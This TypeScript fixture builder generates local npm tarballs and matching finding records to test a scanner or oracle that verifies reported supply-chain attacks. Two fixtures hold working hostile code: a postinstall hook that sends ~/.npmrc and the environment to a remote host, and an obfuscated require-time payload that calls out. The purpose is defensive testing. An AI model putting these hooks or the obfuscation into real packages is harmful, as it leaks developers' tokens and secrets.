/**
 * Builds the demo npm tarballs and their matching finding JSON.
 *
 * Nothing here is published to the real registry. These are local .tgz files the
 * oracle re-scans on demand. Each fixture exercises one branch of the mechanism:
 *
 *   evil-widget       high-severity install-hook exfil          -> happy path
 *   sneaky-utils      obfuscated eval chain, medium severity     -> second listing
 *   clean-lib         genuinely benign                           -> "not reproducible" refusal
 *   overhyped-logger  real low-severity hit, fabricated IOCs     -> "claims unsupported" refusal
 *
 * The "already public" refusal uses a real OSV-listed package (event-stream@3.3.6)
 * and is driven straight from the demo script, not from a local tarball.
 */
import { mkdirSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";
import { gzipSync } from "node:zlib";
import type { Finding } from "../lib/types";

const PKG_DIR = resolve(process.cwd(), "fixtures/packages");
const FINDING_DIR = resolve(process.cwd(), "fixtures/findings");
mkdirSync(PKG_DIR, { recursive: true });
mkdirSync(FINDING_DIR, { recursive: true });

// ------------------------------------------------------------- tar writer

function padTo(buf: Buffer, size: number): Buffer {
  const out = Buffer.alloc(size);
  buf.copy(out);
  return out;
}

function tarHeader(name: string, size: number): Buffer {
  const h = Buffer.alloc(512);
  h.write(`package/${name}`.slice(0, 100), 0, "utf8");
  h.write("0000644\0", 100, "utf8"); // mode
  h.write("0000000\0", 108, "utf8"); // uid
  h.write("0000000\0", 116, "utf8"); // gid
  h.write(size.toString(8).padStart(11, "0") + "\0", 124, "utf8");
  h.write("00000000000\0", 136, "utf8"); // mtime = 0, deterministic
  h.write("        ", 148, "utf8"); // checksum placeholder
  h.write("0", 156, "utf8"); // typeflag: regular file
  h.write("ustar\0", 257, "utf8");
  h.write("00", 263, "utf8");

  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148, "utf8");
  return h;
}

function makeTgz(files: Record<string, string>): Buffer {
  const blocks: Buffer[] = [];
  for (const name of Object.keys(files).sort()) {
    const body = Buffer.from(files[name], "utf8");
    blocks.push(tarHeader(name, body.length));
    blocks.push(padTo(body, Math.ceil(body.length / 512) * 512));
  }
  blocks.push(Buffer.alloc(1024)); // two zero blocks terminate the archive
  return gzipSync(Buffer.concat(blocks), { level: 9 });
}

function write(pkg: string, files: Record<string, string>, finding: Finding | null) {
  const tgz = makeTgz(files);
  const tgzPath = resolve(PKG_DIR, `${pkg}.tgz`);
  writeFileSync(tgzPath, tgz);
  console.log(`package  ${pkg}.tgz  (${tgz.length} bytes)`);
  if (finding) {
    finding.target.artifact = `fixtures/packages/${pkg}.tgz`;
    writeFileSync(resolve(FINDING_DIR, `${pkg}.json`), JSON.stringify(finding, null, 2) + "\n");
    console.log(`finding  ${pkg}.json`);
  }
}

// ----------------------------------------------------- 1. evil-widget (happy)

write(
  "evil-widget-1.2.0",
  {
    "package.json": JSON.stringify(
      {
        name: "evil-widget",
        version: "1.2.0",
        description: "Lightweight UI widgets.",
        main: "index.js",
        scripts: {
          postinstall: "node -e \"eval(Buffer.from(require('fs').readFileSync('./scripts/telemetry.js','utf8'),'utf8').toString())\"",
        },
      },
      null,
      2,
    ),
    "index.js": "module.exports = { Button: () => 'button', Modal: () => 'modal' };\n",
    "scripts/telemetry.js": [
      "// Bundled 'telemetry'. Reads local npm credentials and beacons them out on install.",
      "const os = require('os'); const fs = require('fs'); const https = require('https');",
      "const path = require('path');",
      "function grab(p){ try { return fs.readFileSync(path.join(os.homedir(), p), 'utf8'); } catch { return ''; } }",
      "const payload = { npmrc: grab('.npmrc'), env: process.env };",
      "const body = Buffer.from(JSON.stringify(payload)).toString('base64');",
      "const req = https.request('https://telemetry-cdn.xyz/collect', { method: 'POST' });",
      "req.write(body); req.end();",
    ].join("\n") + "\n",
    "README.md": "# evil-widget\n\nUI widgets.\n",
  },
  {
    schema: "bbb.finding.v1",
    target: { ecosystem: "npm", name: "evil-widget", version: "1.2.0", artifact: "" },
    title: "evil-widget@1.2.0 exfiltrates ~/.npmrc and env on postinstall",
    summary:
      "The postinstall script eval()s a bundled 'telemetry' module that reads the user's ~/.npmrc and full process environment, base64-encodes them, and POSTs them to telemetry-cdn.xyz. Any CI job or developer running `npm install` leaks registry tokens and secrets.",
    iocs: {
      domains: ["telemetry-cdn.xyz"],
      files: ["scripts/telemetry.js"],
      snippets: [".npmrc", "process.env"],
    },
    remediation:
      "Pin away from 1.2.0, rotate any npm tokens present on machines that installed it, and block telemetry-cdn.xyz egress.",
    reporter: "researcher.eth",
  },
);

// -------------------------------------------------- 2. sneaky-utils (second)

write(
  "sneaky-utils-0.4.1",
  {
    "package.json": JSON.stringify(
      { name: "sneaky-utils", version: "0.4.1", description: "String helpers.", main: "lib.js" },
      null,
      2,
    ),
    "lib.js": [
      "// Innocent-looking helpers with an obfuscated payload decoded at require time.",
      "const _0x = ['aHR0cHM6Ly9wa2ctYW5hbHl0aWNzLnRvcC9waW5n'];",
      "function _d(s){ return Buffer.from(s, 'base64').toString('utf8'); }",
      "const glue = String.fromCharCode(101) + String.fromCharCode(118) + String.fromCharCode(97) + String.fromCharCode(108);",
      "try { new Function('require', _d('cmVxdWlyZSgnaHR0cHMnKS5nZXQoX2RbMF0pOw=='))(require); } catch (e) {}",
      "module.exports.slug = (s) => String(s).toLowerCase().replace(/\\s+/g, '-');",
    ].join("\n") + "\n",
    "README.md": "# sneaky-utils\n",
  },
  {
    schema: "bbb.finding.v1",
    target: { ecosystem: "npm", name: "sneaky-utils", version: "0.4.1", artifact: "" },
    title: "sneaky-utils@0.4.1 hides a network call behind an obfuscated eval chain",
    summary:
      "lib.js base64-decodes a string and passes it to new Function() at require time, building 'eval' out of String.fromCharCode to dodge grep-based scanners. The decoded payload (base64 in the source, so it evades literal-string scanners) reaches out to pkg-analytics.top.",
    iocs: {
      // Only indicators literally present in the artifact; the C2 host is base64-encoded
      // in source, so it is described in the summary rather than claimed as a literal IOC.
      domains: [],
      files: ["lib.js"],
      snippets: ["new Function", "fromCharCode"],
    },
    remediation: "Avoid 0.4.1; the maintainer account may be compromised.",
    reporter: "researcher.eth",
  },
);

// ------------------------------------------------- 3. clean-lib (refusal: none)

write(
  "clean-lib-2.0.0",
  {
    "package.json": JSON.stringify(
      { name: "clean-lib", version: "2.0.0", description: "A genuinely boring library.", main: "index.js" },
      null,
      2,
    ),
    "index.js": "function add(a, b) { return a + b; }\nmodule.exports = { add };\n",
    "README.md": "# clean-lib\n\nAdds numbers. That is all.\n",
  },
  {
    schema: "bbb.finding.v1",
    target: { ecosystem: "npm", name: "clean-lib", version: "2.0.0", artifact: "" },
    title: "clean-lib@2.0.0 backdoor (claimed)",
    summary: "Seller claims a hidden backdoor. There isn't one; the detector finds nothing.",
    iocs: { domains: ["evil.example"], files: ["index.js"], snippets: ["backdoor"] },
    remediation: "n/a",
    reporter: "chancer.eth",
  },
);

// ------------------------------ 4. overhyped-logger (refusal: claims unsupported)

write(
  "overhyped-logger-1.0.3",
  {
    "package.json": JSON.stringify(
      { name: "overhyped-logger", version: "1.0.3", description: "Tiny logger.", main: "log.js" },
      null,
      2,
    ),
    // A real but minor hit: one unexpected outbound host. Low severity on its own.
    "log.js": [
      "const https = require('https');",
      "function ping(){ https.get('https://metrics.pkg-analytics.top/v1'); }",
      "module.exports = (msg) => { console.log(msg); };",
    ].join("\n") + "\n",
    "README.md": "# overhyped-logger\n",
  },
  {
    schema: "bbb.finding.v1",
    target: { ecosystem: "npm", name: "overhyped-logger", version: "1.0.3", artifact: "" },
    title: "overhyped-logger@1.0.3 steals SSH keys and drops a reverse shell (claimed)",
    summary:
      "Seller claims credential theft of ~/.ssh/id_rsa and a child_process reverse shell to attacker.example. The artifact does neither; it only makes one analytics call. The writeup is inflated to justify a higher price.",
    iocs: {
      domains: ["attacker.example"],
      files: ["scripts/reverse-shell.js"],
      snippets: ["id_rsa", "child_process"],
    },
    remediation: "n/a",
    reporter: "chancer.eth",
  },
);

console.log("\nFixtures built.");
